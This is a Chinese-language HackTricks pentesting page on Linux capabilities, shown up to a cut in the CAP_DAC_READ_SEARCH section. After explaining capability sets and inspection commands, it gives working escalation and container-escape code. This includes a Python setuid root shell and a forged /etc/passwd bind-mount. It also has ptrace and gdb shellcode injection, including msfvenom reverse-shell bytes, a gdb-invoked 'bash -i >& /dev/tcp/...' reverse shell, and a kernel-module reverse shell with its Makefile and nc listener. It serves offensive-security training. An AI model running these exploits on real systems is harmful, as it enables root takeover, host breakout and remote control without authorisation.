# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

## Linux Capabilities

Linux capabilities 将 **root 权限划分为更小、独立的单元**，允许进程拥有一部分权限。这通过不必要地授予完全的 root 权限来最小化风险。

### 问题：

- 普通用户的权限有限，影响诸如打开需要 root 访问的网络套接字等任务。

### 权限集：

1. **Inherited (CapInh)**：

- **目的**：确定从父进程传递下来的能力。
- **功能**：当创建新进程时，它从其父进程继承此集合中的能力。对于在进程生成中维护某些权限非常有用。
- **限制**：进程不能获得其父进程未拥有的能力。

2. **Effective (CapEff)**：

- **目的**：表示进程在任何时刻实际使用的能力。
- **功能**：这是内核检查以授予各种操作权限的能力集合。对于文件，这个集合可以是一个标志，指示文件的允许能力是否被视为有效。
- **重要性**：有效集合对于即时权限检查至关重要，充当进程可以使用的活动能力集合。

3. **Permitted (CapPrm)**：

- **目的**：定义进程可以拥有的最大能力集合。
- **功能**：进程可以将权限集合中的能力提升到其有效集合，从而使其能够使用该能力。它还可以从其权限集合中删除能力。
- **边界**：它作为进程可以拥有的能力的上限，确保进程不会超过其预定义的权限范围。

4. **Bounding (CapBnd)**：

- **目的**：对进程在其生命周期内可以获得的能力设置上限。
- **功能**：即使进程在其可继承或允许的集合中具有某种能力，除非它也在边界集合中，否则无法获得该能力。
- **用例**：此集合特别有助于限制进程的权限提升潜力，增加额外的安全层。

5. **Ambient (CapAmb)**：
- **目的**：允许某些能力在 `execve` 系统调用中保持，这通常会导致进程能力的完全重置。
- **功能**：确保没有关联文件能力的非 SUID 程序可以保留某些权限。
- **限制**：此集合中的能力受可继承和允许集合的约束，确保它们不超过进程的允许权限。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
有关更多信息，请查看：

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 进程与二进制文件能力

### 进程能力

要查看特定进程的能力，请使用 /proc 目录中的 **status** 文件。由于它提供了更多细节，我们将其限制为与 Linux 能力相关的信息。\
请注意，对于所有正在运行的进程，能力信息是按线程维护的，对于文件系统中的二进制文件，它存储在扩展属性中。

您可以在 /usr/include/linux/capability.h 中找到定义的能力。

您可以在 `cat /proc/self/status` 中找到当前进程的能力，或通过 `capsh --print` 查看其他用户的能力在 `/proc/<pid>/status` 中。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
此命令在大多数系统上应返回 5 行。

- CapInh = 继承的能力
- CapPrm = 允许的能力
- CapEff = 有效的能力
- CapBnd = 边界集
- CapAmb = 环境能力集
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用 capsh 工具，我们可以将它们解码为能力名称。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
现在让我们检查一下 `ping` 使用的 **capabilities**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
虽然这样可以工作，但还有另一种更简单的方法。要查看正在运行的进程的能力，只需使用 **getpcaps** 工具，后面跟上其进程 ID (PID)。您还可以提供一个进程 ID 列表。
```bash
getpcaps 1234
```
让我们检查一下 `tcpdump` 的能力，在给二进制文件足够的能力（`cap_net_admin` 和 `cap_net_raw`）以嗅探网络之后（_tcpdump 正在进程 9562 中运行_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
如您所见，给定的能力与获取二进制文件能力的两种方式的结果相对应。\
_getpcaps_ 工具使用 **capget()** 系统调用查询特定线程的可用能力。此系统调用只需要提供 PID 以获取更多信息。

### 二进制文件能力

二进制文件可以具有在执行时可以使用的能力。例如，找到具有 `cap_net_raw` 能力的 `ping` 二进制文件是非常常见的：
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
您可以使用以下方法**搜索具有能力的二进制文件**：
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

如果我们为 \_ping* 删除 CAP*NET_RAW 能力，那么 ping 工具将不再工作。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了 _capsh_ 本身的输出，_tcpdump_ 命令本身也应该引发错误。

> /bin/bash: /usr/sbin/tcpdump: 操作不允许

错误清楚地表明 ping 命令不允许打开 ICMP 套接字。现在我们可以确定这按预期工作。

### 移除能力

您可以通过以下方式移除二进制文件的能力：
```bash
setcap -r </path/to/binary>
```
## 用户能力

显然**也可以将能力分配给用户**。这可能意味着用户执行的每个进程都将能够使用用户的能力。\
根据[这个](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[这个](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)和[这个](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)，需要配置一些文件以赋予用户某些能力，但分配能力给每个用户的文件将是`/etc/security/capability.conf`。\
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

编译以下程序可以**在提供能力的环境中生成一个 bash shell**。
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在**由编译的环境二进制文件执行的bash内部**，可以观察到**新的能力**（普通用户在“当前”部分不会有任何能力）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> 你只能**添加在允许和继承集合中都存在的能力**。

### 能力感知/能力无知的二进制文件

**能力感知的二进制文件不会使用环境中赋予的新能力**，然而**能力无知的二进制文件会使用**这些能力，因为它们不会拒绝它们。这使得能力无知的二进制文件在一个授予二进制文件能力的特殊环境中变得脆弱。

## 服务能力

默认情况下，**以 root 身份运行的服务将被分配所有能力**，在某些情况下这可能是危险的。\
因此，**服务配置**文件允许**指定**你希望它拥有的**能力**，**以及**应该执行该服务的**用户**，以避免以不必要的权限运行服务：
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker 容器中的能力

默认情况下，Docker 会为容器分配一些能力。通过运行以下命令，可以很容易地检查这些能力：
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

能力在你**想要在执行特权操作后限制自己的进程**时非常有用（例如，在设置 chroot 和绑定到套接字后）。然而，它们可以通过传递恶意命令或参数来被利用，这些命令或参数随后以 root 身份运行。

你可以使用 `setcap` 强制程序获得能力，并使用 `getcap` 查询这些能力：
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` 表示您正在将能力添加为有效和允许（“-”将移除它）。

要识别系统或文件夹中具有能力的程序：
```bash
getcap -r / 2>/dev/null
```
### 利用示例

在以下示例中，发现二进制文件 `/usr/bin/python2.6` 存在提权漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**tcpdump**所需的**能力**以**允许任何用户嗅探数据包**：
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空" 能力的特殊情况

[来自文档](https://man7.org/linux/man-pages/man7/capabilities.7.html)：请注意，可以将空能力集分配给程序文件，因此可以创建一个设置用户ID为root的程序，该程序将执行该程序的进程的有效和保存的用户ID更改为0，但不会赋予该进程任何能力。简单来说，如果你有一个二进制文件：

1. 不属于root
2. 没有设置 `SUID`/`SGID` 位
3. 设置了空能力（例如：`getcap myelf` 返回 `myelf =ep`）

那么**该二进制文件将以root身份运行**。

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种非常强大的Linux能力，通常被视为接近root级别，因为它具有广泛的**管理权限**，例如挂载设备或操纵内核特性。虽然对于模拟整个系统的容器来说是不可或缺的，但**`CAP_SYS_ADMIN` 带来了重大的安全挑战**，尤其是在容器化环境中，因为它可能导致特权提升和系统妥协。因此，其使用需要严格的安全评估和谨慎管理，强烈建议在特定应用的容器中放弃此能力，以遵循**最小权限原则**并最小化攻击面。

**带有二进制文件的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用 Python，您可以将修改过的 _passwd_ 文件挂载到真实的 _passwd_ 文件上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后**挂载**修改过的 `passwd` 文件到 `/etc/passwd`：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
您将能够 **`su` 为 root**，使用密码 "password"。

**带环境的示例（Docker 突破）**

您可以使用以下命令检查 Docker 容器内启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中，您可以看到 SYS_ADMIN 能力已启用。

- **挂载**

这允许 docker 容器 **挂载主机磁盘并自由访问**：
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **完全访问**

在前一种方法中，我们成功访问了docker主机磁盘。\
如果您发现主机正在运行**ssh**服务器，您可以**在docker主机**磁盘中创建一个用户并通过SSH访问它：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**这意味着您可以通过在主机内部某个进程中注入 shellcode 来逃离容器。** 要访问在主机内部运行的进程，容器需要至少以 **`--pid=host`** 运行。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的调试和系统调用跟踪功能的能力，以及像 `process_vm_readv(2)` 和 `process_vm_writev(2)` 这样的跨内存附加调用。尽管对于诊断和监控目的非常强大，但如果在没有像 seccomp 过滤器这样的限制措施的情况下启用 `CAP_SYS_PTRACE`，可能会显著削弱系统安全性。具体来说，它可以被利用来规避其他安全限制，特别是 seccomp 强加的限制，正如 [这样的概念证明 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) 所示。

**使用二进制文件的示例 (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**使用二进制的示例 (gdb)**

`gdb` 与 `ptrace` 能力:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
使用msfvenom创建一个shellcode，通过gdb注入内存
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
调试一个 root 进程使用 gdb，并复制粘贴之前生成的 gdb 行：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**示例与环境（Docker 突破） - 另一个 gdb 滥用**

如果 **GDB** 已安装（或者你可以通过 `apk add gdb` 或 `apt install gdb` 安装它，例如），你可以 **从主机调试一个进程** 并使其调用 `system` 函数。（此技术还需要能力 `SYS_ADMIN`）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
您将无法看到执行命令的输出，但该进程将执行该命令（因此获取反向 shell）。

> [!WARNING]
> 如果您收到错误 "No symbol "system" in current context."，请检查通过 gdb 在程序中加载 shellcode 的前一个示例。

**带环境的示例（Docker 突破） - Shellcode 注入**

您可以使用以下命令检查 docker 容器内启用的能力：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出 **主机** 中运行的 **进程** `ps -eaf`

1. 获取 **架构** `uname -m`
2. 查找适合该架构的 **shellcode** ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. 查找一个 **程序** 来 **注入** **shellcode** 到进程内存中 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **修改** 程序中的 **shellcode** 并 **编译** 它 `gcc inject.c -o inject`
5. **注入** 并获取你的 **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 使进程能够 **加载和卸载内核模块（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用）**，提供对内核核心操作的直接访问。此能力带来了严重的安全风险，因为它允许特权升级和完全系统妥协，通过允许对内核的修改，从而绕过所有 Linux 安全机制，包括 Linux 安全模块和容器隔离。
**这意味着你可以** **在主机的内核中插入/移除内核模块。**

**带二进制文件的示例**

在以下示例中，二进制文件 **`python`** 拥有此能力。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** 命令会检查目录 **`/lib/modules/$(uname -r)`** 中的依赖列表和映射文件。\
为了利用这一点，让我们创建一个假的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后**编译内核模块，您可以在下面找到 2 个示例，并将其复制**到此文件夹：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的python代码以加载此内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**示例 2：使用二进制文件**

在以下示例中，二进制文件 **`kmod`** 具有此能力。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
这意味着可以使用命令 **`insmod`** 插入内核模块。按照下面的示例获取一个 **reverse shell**，利用这个特权。

**带环境的示例（Docker 突破）**

您可以使用以下命令检查 Docker 容器内启用的能力：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中，您可以看到 **SYS_MODULE** 权限已启用。

**创建** 将要执行反向 shell 的 **内核模块** 以及 **Makefile** 以 **编译** 它：
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile 中每个 make 单词前的空白字符 **必须是制表符，而不是空格**！

执行 `make` 进行编译。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最后，在一个 shell 中启动 `nc`，并从另一个 shell 中**加载模块**，你将会在 nc 进程中捕获到 shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**该技术的代码来自于“滥用SYS_MODULE能力”的实验室** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

该技术的另一个示例可以在 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) 中找到。

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 使进程能够 **绕过读取文件和读取及执行目录的权限**。它的主要用途是用于文件搜索或读取。然而，它还允许进程使用 `open_by_handle_at(2)` 函数，该函数可以访问任何文件，包括那些在进程的挂载命名空间之外的文件。在 `open_by_handle_at(2)` 中使用的句柄应该是通过 `name_to_handle_at(2)` 获得的非透明标识符，但它可以包含易受篡改的敏感信息，如 inode 号。该能力的潜在利用，特别是在 Docker 容器的上下文中，已被 Sebastian Krahmer 通过 shocker 漏洞演示，如 [这里](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 分析的那样。
**这意味着您可以** **绕过文件读取权限检查和目录读取/执行权限检查。**

**带有二进制文件的示例**

该二进制文件将能够读取任何文件。因此，如果像 tar 这样的文件具有此能力，它将能够读取 shadow 文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
